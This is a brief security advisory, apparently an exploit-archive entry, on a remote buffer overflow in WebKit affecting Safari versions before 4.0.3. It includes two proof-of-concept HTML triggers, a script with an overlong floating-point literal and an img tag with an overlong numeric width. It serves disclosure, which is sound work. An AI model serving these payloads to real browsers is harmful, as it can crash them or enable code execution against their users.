WebKit is prone to a remote buffer-overflow vulnerability.

An attacker can exploit this issue to execute arbitrary code in the context of the application. Failed exploit attempts will result in a denial-of-service condition.

Versions prior to Apple Safari 4.0.3 are vulnerable; other applications using WebKit may also be affected.


Example 1:
---------
<script>
var Overflow = "31337" + 0.313373133731337313373133731337...;
</script>
---------

Example 2:
---------
<img width=0.3133731337313373133731337... src="31337.jpg">
